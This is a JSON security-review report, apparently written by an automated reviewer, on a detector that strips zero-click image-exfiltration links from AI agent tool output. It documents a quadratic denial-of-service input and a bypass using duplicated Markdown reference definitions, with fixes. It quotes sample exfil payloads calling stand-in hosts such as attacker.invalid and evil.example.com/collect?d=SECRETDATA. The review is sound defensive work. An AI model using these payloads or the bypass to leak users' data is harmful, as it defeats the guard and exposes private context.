@@ -1,0 +1,264 @@
+{
+  "contract_version": "1.0.0",
+  "run_id": "T78-independent-review",
+  "dispatch_id": "T78",
+  "status": "DONE_WITH_CONCERNS",
+  "summary": "Independent review of T77 on the auto-fetch exfil floor. All three T72 blockers and all three T72 majors are closed at the detector and at all four public boundaries; the new label condition is genuinely NECESSARY (0 counterexamples across the BMP; no cliff at 998/999/1000/1200/4096); the cubic path is gone; eleven prior matrices are byte-identical in four-way agreement with T66/T72/T77; the marked-viability refutation is correct on its decisive axis, verified at package.json and bun.lock. Two NEW blockers, both reproduced at all four public boundaries and therefore fixable-now under the RESIDUALS exception: (1) the label budget is derived from the attacker's own document, so one long [ref]: URL line restores a quadratic path (400 KB -> 19 037.7 ms, exponent 2.00; 4.0-10.9 s at each boundary on 128 KB) — a regression against the pre-T77 constant; (2) a duplicated reference definition releases the URL a renderer fetches, because the table is last-wins where CommonMark is first-wins, leaking at all four boundaries with redaction.state \"redacted\" (pre-existing, missed by eight rounds). Three documentation-grade findings, including a misidentified vector in T77's benign-corpus account. Both audited honesty claims are accurate.",
+  "acceptance": [
+    {
+      "criterion": "AC5 (AFC-15): no field-name or spelling bypass; a URL secret is masked; a public Markdown link is not treated as a network send",
+      "status": "partial",
+      "evidence": "T72-md rendererConfirmedBypasses [], supersetViolations 0; T72-gates bypasses []; T72-boundary hostileLeakingCount 0, leakingWithStateNone [], ac5PublicLinkReleased true, ac5RelativeReleased true, maskLandsOnRawBytes true, allowlistRemedyWorks true; T42-charrefs (240 cases) and T53-extract (88 cases) byte-identical at 0 bypasses. PARTIAL only because of T78#F-002: a duplicated reference definition is a spelling of a covered form that leaks at all four boundaries (T78-dup.log leakingCount 6)."
+    },
+    {
+      "criterion": "The three blockers and three majors are closed at the detector and at all four public boundaries, with no new bypass and no benign content newly flagged beyond the explained two",
+      "status": "partial",
+      "evidence": "All six closed and independently re-measured (T78-T72-*.log; eight new nesting shapes and thirteen new label shapes all resolve correctly). Benign corpus 16 files / 62 findings / no new policy id / Part B same 7 ids, and the +2 is confined to the repository's own attack fixture and is a correct finding — but T77 names the wrong vector for it (T78#F-003). PARTIAL because one NEW bypass was found: T78#F-002."
+    },
+    {
+      "criterion": "No pathological input: state the worst shape you found and its cost",
+      "status": "not_met",
+      "evidence": "Worst shape: balancedNest_withLongDef — one 200 000-character [ref]: URL definition plus \"[\".repeat(100000)+\"]\".repeat(100000), 400 029 bytes, 19 037.7 ms, growth exponent 2.00 (control without the definition: 200 000 bytes, 49.9 ms). At the four public boundaries on a 128 029-byte payload: 4 332.4 / 10 865.8 / 5 550.2 / 4 042.4 ms. Raw T78-perf.log, T78-boundary.log."
+    },
+    {
+      "criterion": "Every finding is classified as blocking-and-reproduced or documentation-grade so the residual list can be trusted",
+      "status": "met",
+      "evidence": "T78-review.md section 'Residual classification': F-001 and F-002 blocking-and-reproduced (all four boundaries, with the reasoning for treating a denial of service as blocking stated rather than assumed); F-003, F-004, F-005 documentation-grade with the RESIDUALS entry each should become."
+    },
+    {
+      "criterion": "The viability refutation is correct, since it is why the module keeps hand-rolled extraction",
+      "status": "met",
+      "evidence": "package.json:59 dependencies {}; marked absent from all three dependency maps; bun.lock:374 declares marked@17.0.1 and bun.lock:68 shows its only path is @opentui/core, listed at package.json:60-64 under optionalDependencies; scripts.build passes --external @opentui/core and files ships dist only. A module-load import would therefore throw wherever the optional dependency was skipped, taking all four boundaries with it. Axis 0 is dispositive on its own, as T77 says."
+    }
+  ],
+  "artifacts": [
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-review.md",
+      "kind": "review",
+      "exists": true,
+      "summary": "Full review: scope, hashes, Stage 1 table, 5 findings, residual classification, honesty audit, evidence, routing audit.",
+      "hash": "1884148c9bbd21d45b87b59c5ac74665375c6ef7fe936221f24a82b619088525"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-perf.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Perf probe isolating the attacker-chosen label budget with matched _noDef/_withLongDef/_shortDef triples.",
+      "hash": "dd1525225a1deb172f0c98e575b1ba8625f70950a19caaa684c7ce04eb03fd7a"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-boundary.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "The new pathological shape driven through all four public boundaries, plus a size ladder.",
+      "hash": "bf1fdcd170297661c530653fd529ce223ef13642778e4622dda8e504e3dac8a8"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-md.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Attack on the new label condition (BMP necessity sweep, whitespace-class agreement, length sweep) plus eight nesting shapes and the duplicate-definition class, with marked as oracle.",
+      "hash": "ea6eff9cb56a5fd5b3c7e4af43c191943329a495028d8ed2c6a956efb8f4dd01"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-dup.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "The duplicate reference-definition bypass at all four public boundaries, six spellings plus a control.",
+      "hash": "7a39be66c4dc2a0fa9521b10e0bb19f51a1d254982418d358284e75c3cbf8f72"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-corpus.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Mechanical check of T77's benign-corpus +2 explanation against the fixture's own bytes.",
+      "hash": "24a33cc8909598dd54b53ff1c7091999f99d746a85571d3c4fb2ec1973000071"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/.T78-hashes-start.txt",
+      "kind": "context",
+      "exists": true,
+      "summary": "Start hashes of every file under review.",
+      "hash": "a49f3ca993205d0702c8f8d96312eb72fd3a37a1f41fc3a0a35630aa1a01c4eb"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/.T78-hashes-end.txt",
+      "kind": "context",
+      "exists": true,
+      "summary": "End hashes; diff against start is clean (no drift).",
+      "hash": "a49f3ca993205d0702c8f8d96312eb72fd3a37a1f41fc3a0a35630aa1a01c4eb"
+    }
+  ],
+  "changed_files": [],
+  "findings": [
+    {
+      "id": "F-001",
+      "global_id": "T78#F-001",
+      "reviewer": "T78-independent-review-security-code+review-logic",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 672,
+      "symbol": "labelWithinBudget / LabelBudget.maxLength",
+      "problem": "T77 removed MAX_REFERENCE_LABEL and replaced it with `nonWhitespaceCount(span) <= maxKeyLength`, where maxKeyLength is the longest key THIS DOCUMENT's own `[ref]: URL` lines produced. The document is the attacker's payload, so the bound that makes the label path cheap is attacker-chosen. When it is 0 the path short-circuits at :779 before slicing — which is the case in every one of the 29 perf shapes T72 and T77 measured. One long definition raises it arbitrarily and every opening bracket whose span passes the O(1) budget test is then sliced, whitespace-collapsed and lowercased at O(span); in a bracket run the spans are O(n) and there are O(n) of them. The cost is paid TWICE, because the inline pass at :1247 also calls readBracketConstructs and discards every reference construct it builds, and the `!` gate that would make that work unnecessary is at :1335, after the work.",
+      "impact": "Measured on the shipped detector. Control balancedNest_noDef 200 000 bytes = 49.9 ms; balancedNest_withLongDef 400 029 bytes = 19 037.7 ms, growth exponent 2.00. Also openRunOneClose_withLongDef (1.72) and bangOpenRunOneClose_withLongDef (2.04). At the four public boundaries on ONE 128 029-byte payload: dispatchCallTool 4 332.4 ms, prepareOutputForPersistence 10 865.8 ms, validateOutputForTransport 5 550.2 ms, redactToolOutput 4 042.4 ms — all four over a second. ~90 KB crosses one second; 256 029 bytes costs 21 157.2 ms. The floor is mandatory, cannot be skipped, and the payload is attacker-chosen: denial of service in a security control, and a REGRESSION against the pre-T77 tree where the removed constant bounded this path (T72 measured longLabelUse at 3.1 ms on 400 KB).",
+      "suggested_fix": "(a) Move the `!` gate before the work: the inline pass never reads a reference construct and the reference pass discards them for non-image opens, so readBracketConstructs should not build them unless the caller wants them — this alone removes the two `[`-run shapes. (b) Tighten the necessary condition from 'at most maxKeyLength' to 'EXACTLY a length some key has': a span's normalised length is O(1) from two prefix arrays (the existing non-whitespace count plus a count of whitespace-run starts), and a Set of key lengths then admits at most one candidate span per description end instead of all of them. (c) If a shape survives (b), give the label path a per-document work budget proportional to content.length and, when exhausted, FLAG rather than release — a cost bound whose failure direction is a finding. Then add a definition-carrying variant of every existing perf shape to T77-perf.ts; the absence of one is what let this through.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-perf.ts -> shapesOverOneSecond: [balancedNest_withLongDef, openRunOneClose_withLongDef, bangOpenRunOneClose_withLongDef]; superLinearShapes exponents 2.00 / 1.72 / 2.04; matched _noDef controls flat and _shortDef (budget 4) flat at 17.7 ms, which isolates the budget rather than the bracket run as the cause. Raw .metaproject/data/gdctx/raw/T78-perf.log (sha256 8d5820afc554b9a634e826841362190d996631ec134ca4ab5a7cdf2c5a5f0115). Boundaries: bun .../T78-boundary.ts -> boundariesOverOneSecond = all four, with the ladder 8 KB=11.2 ms -> 256 KB=21 157.2 ms; raw T78-boundary.log (sha256 98a9b3ff20d05b4bead8c3f2c5c65cd03d5185d5c369ade86ff8349107858e3c).",
+      "confidence": "high",
+      "dedupe_key": "exfil-label-budget-attacker-chosen-quadratic-dos",
+      "blocking_merge": true,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:672-680 (labelWithinBudget, the O(1) gate)",
+          "src/security/detect/exfil.ts:779 (the maxLength === 0 short-circuit that hides the cost in every measured shape)",
+          "src/security/detect/exfil.ts:789-807 (the slice + normaliseLabel the budget gates)",
+          "src/security/detect/exfil.ts:1247-1253 (the inline pass builds reference constructs it discards)",
+          "src/security/detect/exfil.ts:1313-1335 (the `!` gate placed after the work)",
+          "src/security/detect/exfil.ts:1182-1201 (maxLabelLength, derived from attacker-supplied REFERENCE_DEF matches)"
+        ],
+        "enumeration_method": "Every O(1)-gated allocation in the two markdown passes was located by reading readBracketConstructs and both of its callers line by line, and each was asked 'what makes the gate cheap, and is that thing under the attacker's control?'. There is exactly one such gate (LabelBudget) and exactly one thing it is derived from (REFERENCE_DEF matches in the payload). Seven shapes were then scaled across four sizes each with the growth exponent computed per shape, in matched _noDef / _withLongDef / _shortDef triples so the CAUSE is isolated: _shortDef (budget 4) stays flat, which proves the budget rather than the bracket run is the variable."
+      }
+    },
+    {
+      "id": "F-002",
+      "global_id": "T78#F-002",
+      "reviewer": "T78-independent-review-security-code+review-logic",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 1189,
+      "symbol": "detectExfil (reference-definition table) / refs.set",
+      "problem": "CommonMark: 'If there are several matching definitions, the first one takes precedence.' The detector builds `refs` with Map.set per match, so the LAST definition wins, and the finding's masked span is that last definition's URL. A document defining the same label twice therefore has its SECOND definition masked while a renderer resolves and fetches the FIRST. Neither half is a spelling trick: both are ordinary reference definitions, and the detector does report a finding, so nothing looks wrong to the caller.",
+      "impact": "Six spellings measured, all renderer-confirmed with `marked` and all leaking at ALL FOUR public boundaries with attacker.invalid present in the output: shortcut ![a], full ![a][a], collapsed ![a][], a case-differing duplicate ([A]: then [a]:), a whitespace-differing duplicate ([b  c]: then [b c]:, a collision the T72#F-005 fix newly creates) and three definitions. Worse than a plain release: redaction.state is \"redacted\" and isError false at every boundary, so the caller is told the payload was handled while the zero-click destination is still in it. Reachable under the DEFAULT empty allowlist. The control c1SingleDef is closed, so the defect is specific to duplication. Pre-existing — `git show HEAD:src/security/detect/exfil.ts` carries the same refs.set at :99 — so it is a gap eight rounds of enumeration missed, not a T77 regression. It also falsifies policies.md:28's «перечень полный, не пример» for the reference forms.",
+      "suggested_fix": "Keep the FIRST definition — `if (!refs.has(ref)) refs.set(ref, { url, start })` — which is both CommonMark's rule and the safe direction, and is one line that no test pins. If over-approximating is preferred instead (a duplicate is itself suspicious), make the table's value a list and push one finding per definition of a label an image use resolves, which closes the class in every renderer rather than only CommonMark-conformant ones. Either way add a duplicate-definition row to T71_CLASS_VECTORS / T77_CLASS_VECTORS, since no boundary regression currently reaches it; maxLabelLength is computed over all definitions and is unaffected.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-md.ts -> bypasses: [dupFirstAttacker, dupFirstAttackerAllowlisted], each printing marked's emitted <img src=\"https://attacker.invalid/p?ctx=CTX\"> beside a redacted output that still contains the attacker host; raw .metaproject/data/gdctx/raw/T78-md.log (sha256 fcdccacc24b8ca1b565fcd8031aafbe71d7e102861f366195483eff94def852a). Boundaries: bun .../T78-dup.ts -> leakingAtAnyBoundary: [d1ShortcutDupDef, d2FullDupDef, d3CollapsedDupDef, d4DupDefCaseSpelling, d5DupDefWhitespaceSpelling, d6ThreeDefs], leakingCount: 6, every row mcpState \"redacted\" with mcpLeaksAttacker/persistLeaksAttacker/transportLeaksAttacker/seamLeaksAttacker true, control c1SingleDef all false; raw T78-dup.log (sha256 407eceec19ae9fa8facf56879196668797010e931c76f10d94965f15243be089).",
+      "confidence": "high",
+      "dedupe_key": "exfil-duplicate-reference-definition-last-wins-release",
+      "blocking_merge": true,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:1183-1192 (the definition table loop, Map.set last-wins)",
+          "src/security/detect/exfil.ts:1338-1348 (the single-def lookup and the single finding it pushes)",
+          "docs/requirements/keryx-agent-first-core/policies.md:28 (the completeness claim over the three reference spellings)"
+        ],
+        "enumeration_method": "Every place the detector builds a COLLECTION keyed by attacker-supplied text was enumerated — there is exactly one, `refs` — and each was checked against the corresponding CommonMark or HTML precedence rule for a COLLISION: first-wins, last-wins, or all. The markdown table is last-wins where the standard is first-wins. The HTML side's analogous case, a duplicate attribute, is resolved EAGERLY (any spelling opens the gate — readStartTag's documented over-approximation, T66#F-008), which is the safe direction; the markdown table is the one that is not. Six spellings were then driven through `marked` and all four public boundaries, with a single-definition control."
+      }
+    },
+    {
+      "id": "F-003",
+      "global_id": "T78#F-003",
+      "reviewer": "T78-independent-review-security-code+review-logic",
+      "severity": "minor",
+      "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T77-implementation.md",
+      "line": null,
+      "symbol": "Part 3 'The benign corpus' / Concern 4",
+      "problem": "T77 states the corpus's two extra findings are the vector `ex09-image-1x1-tracker` (`![ ](https://c2.example-attacker.com/1x1.gif?leak=Y)`), released before because 'a surrounding bracket pair in the JSON made it an image inside a link's description'. Measured: the only span the T77 change newly scans is a link's DESCRIPTION, and no inline construct in the fixture spans ex09 at offset 1757 — every `[` and both of its description ends were enumerated and the count is 0 for both worktree copies. ex09 was already flagged before. The vector that actually changed is the LINE-4 image `https://evil.example.com/collect?d=SECRETDATA`: the JSON array's own `[` at offset 332 resolves, through the first-`]` reading, to an inline LINK whose destination is that URL and whose construct ends at 499, and the image open `![status]` at offset 444 lies inside [332, 499) — exactly the span the pre-T77 code skipped.",
+      "impact": "None on any verdict. The count (+2), the two files, the direction and the conclusion ('no ordinary file became a finding, no new benign carrier, no new policy id') are all confirmed by my own run, and the newly flagged finding is a genuine attack vector previously released. Recorded because T77-implementation.md is what the next round inherits as the settled account of the +2, and because the mechanism it states is not what happened: the enclosing construct is one the JSON's array bracket forms with a `]` inside a case string, which is a sharper illustration of context-blind scanning than the narrative gives.",
+      "suggested_fix": "Correct the vector name and the mechanism in T77-implementation.md's corpus section and Concern 4. No code change.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-corpus.ts -> explanationHolds: false, enclosingInlineConstructsContainingEx09: 0, ex09Start: 1757 for both worktree copies; raw .metaproject/data/gdctx/raw/T78-corpus.log (sha256 3fb901e34661d3beb25750dbc125d06a96589bb48e87f03d5a97f2f8ce24881c). The array-bracket construct: arrayOpen 332 -> constructEnd 499, arrayOpenResolvesTo 'https://evil.example.com/collect?d=SECRETDATA', imageOpensInsideThatConstruct [{at: 444, '![status](https://evil.example.com/collect?d=SECRETDATA) done'}]. Counts: T78-T53-corpus.log (sha256 6a56dbea9bf12ceca107e05dc79d21b0ba88e0b4e6cab4773dcb369cb659f3db; 16 files / 62 findings / Part B 7 ids) against T72-rerun-T53-corpus.log and T77-before-T53-corpus.log (both 16 / 60, both showing the two cases.json copies at 2).",
+      "confidence": "high",
+      "dedupe_key": "t77-corpus-plus-two-vector-misidentified",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T77-implementation.md (Part 3 'The benign corpus', Concern 4)"
+        ],
+        "enumeration_method": "The claim was turned into a decidable predicate — the only span T77 newly scans is a link's description, so the explanation holds iff some non-image `[` has open < imageOpen < descriptionEnd — and `descriptionEnds` + `readInlineDestination` were replicated over the fixture's own bytes for every `[` in both worktree copies, rather than trusting the narrative. The actual mechanism was then located by resolving the file's first `[` and enumerating the image opens inside the construct it forms."
+      }
+    },
+    {
+      "id": "F-004",
+      "global_id": "T78#F-004",
+      "reviewer": "T78-independent-review-security-code+review-logic",
+      "severity": "minor",
+      "file": "docs/requirements/keryx-agent-first-core/policies.md",
+      "line": 32,
+      "symbol": "Auto-fetch floor: the attribute-gate decoding sentence",
+      "problem": "policies.md:32 says the two attribute gates' values are compared after character-reference decoding «как их декодирует renderer» — 'as the renderer decodes them'. A conformant tokenizer decodes an attribute value ONCE. `decodeCharacterReferences` (exfil.ts:256-266) loops to a fixed point (MAX_DECODE_PASSES), which is deliberate and documented for the URL path but also reaches the two gates. Measured: `<input type=\"&amp;#105;mage\" src=…>` and `<meta http-equiv=\"&amp;#114;efresh\" content=…>` are both flagged, and neither opens the gate in any renderer — `&amp;#105;mage` decodes once to the literal text `&#105;mage`.",
+      "impact": "Over-approximation, i.e. the safe direction — a masked destination in markup no renderer fetches, no bypass. It matters only because this subsection is the one a reader is told is checkable in both directions, and because the module header at :94-101 presents the gate decoding as renderer-faithful without saying it is multi-pass. T72 measured the same two rows (T72-extra.log doubleEncoded / doubleEncodedMeta, rendererGateOpen=false detectorFindings=1) and did not raise them.",
+      "suggested_fix": "State the multi-pass decode in policies.md:32 and in the module header as the deliberate over-approximation it is ('decoded to a fixed point, which is wider than a renderer and errs toward flagging'), or restrict the two gates to a single pass while leaving the URL path's repeat intact. Documentation is the cheaper of the two and matches the floor's current direction.",
+      "evidence": "detectExfil returns 1 finding for `<input type=\"&amp;#105;mage\" src=\"https://attacker.invalid/p?ctx=CTX\">` and 1 for the double-encoded `<meta http-equiv=\"&amp;#114;efresh\" …>`; the mechanism is exfil.ts:254-266, whose own comment says 'Bounded repetition so a double-encoded &amp;#58; also resolves'. Cross-checked against T72's recorded rows in T78-T72-extra.log.",
+      "confidence": "high",
+      "dedupe_key": "exfil-gate-multipass-decode-vs-renderer-faithful-claim",
+      "blocking_merge": false,
+      "related_skill": "review-security-code",
+      "learning_candidate": false,
+      "class_scope": {
+        "sites": [
+          "docs/requirements/keryx-agent-first-core/policies.md:32",
+          "src/security/detect/exfil.ts:94-101 (module header, the gate-decoding paragraph)",
+          "src/security/detect/exfil.ts:254-266 (decodeCharacterReferences, the bounded repeat)"
+        ],
+        "enumeration_method": "Every caller of decodeCharacterReferences was enumerated and split into those where multi-pass decoding is a deliberate over-approximation already disclosed (the URL path, renderableUrl, metaRefreshDestination) and those where the normative text claims renderer fidelity (hasAttributeValue's two gates, and the srcset decoded split). The two gates are the members; each was driven with a double-encoded spelling."
+      }
+    },
+    {
+      "id": "F-005",
+      "global_id": "T78#F-005",
+      "reviewer": "T78-independent-review-security-code+review-logic",
+      "severity": "info",
+      "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T77-implementation.md",
+      "line": null,
+      "symbol": "Part 3 oracle table / Concerns 1-2",
+      "problem": "Honesty audit of the two claims the dispatch names. Both are ACCURATE. (1) 'marked cannot confirm the three srcset rows' is stated in the module header (exfil.ts:118-132), in T77-spec.md and in T77-implementation.md's per-question oracle table, which writes 'none in this checkout' where there is no oracle, and cites the exact row (rendererFetchesOnCoveredRows: srcsetDecodedComma=false) rather than merely asserting the limitation. (2) 'nesting beyond one level is over-approximation no oracle can settle' is correct: marked resolves one level, the depth-2..6 rows are flagged deliberately, the direction is toward flagging, and the alternative is the depth bound this file's history argues against. The one thing wider than its evidence is adjacent: the oracle table calls the markdown question 'Settled by measurement', which is true of the rows enumerated but not of the surface — T78#F-002 is a reference-form row no enumeration in eight rounds reached.",
+      "impact": "None on any verdict. Recorded so the next round inherits the distinction between 'settled for these rows' and 'settled', which is the distinction T78#F-002 turns on.",
+      "suggested_fix": "No action required. When T78#F-002 is fixed, restate the oracle table's markdown row as 'settled for the enumerated rows' and name the enumeration, so a future round does not read it as coverage of the surface.",
+      "evidence": "T77-implementation.md Part 3 table and Concerns 1-2 read in full against src/security/detect/exfil.ts:118-132; the srcset behaviour independently confirmed at T78-T72-srcset.log (sha256 2e96f8d79ee8d8a4a9b3190781677066cb7e16e71dbdb927d58889a678021000, all 6 rows verdict=ok) and the nesting direction at T78-md.log rows imageInImageInLink / caseFoldSharpS, where marked and the detector agree on release.",
+      "confidence": "high",
+      "dedupe_key": "t77-oracle-labelling-audit",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T77-implementation.md (Part 3, Concerns 1-2)",
+          "src/security/detect/exfil.ts:118-132 (the module header's oracle block)"
+        ],
+        "enumeration_method": "Every claim in the module and in T77-implementation.md that attributes a conclusion to an oracle was listed and sorted by which oracle it names, then each was checked against what that oracle can observe: marked (rendering, not decoding, not raw HTML), HTMLRewriter/lol-html (attribution and tag boundaries, raw attribute source only, not decoding), timing (no oracle needed), and the spec text (asserted, not measured). Four questions, four answers, all four labelled correctly in the artifact."
+      }
+    }
+  ],
+  "questions": [],
+  "errors": [],
+  "metrics": {
+    "duration_ms": null,
+    "prompt_tokens": null,
+    "output_tokens": null,
+    "retries": 0,
+    "findings_by_severity": {
+      "blocker": 2,
+      "major": 0,
+      "minor": 2,
+      "info": 1
+    },
+    "blocking_and_reproduced": 2,
+    "documentation_grade": 3,
+    "probes_written": 5,
+    "prior_matrices_reproduced_byte_identical": 11,
+    "focused_suites": {
+      "pass": 109,
+      "fail": 0,
+      "expect_calls": 1110,
+      "exit": 0
+    },
+    "benign_corpus": {
+      "files_with_findings": 16,
+      "findings": 62,
+      "new_policy_ids": 0,
+      "part_b_flagged": 7
+    },
+    "worst_shape": {
+      "name": "balancedNest_withLongDef",
+      "bytes": 400029,
+      "ms": 19037.7,
+      "growth_exponent": 2.0
+    },
+    "boundaries_over_one_second_on_128kb": 4,
+    "file_drift": "none"
+  },
+  "timestamp_utc": "2026-09-06T20:23:57Z"
+}
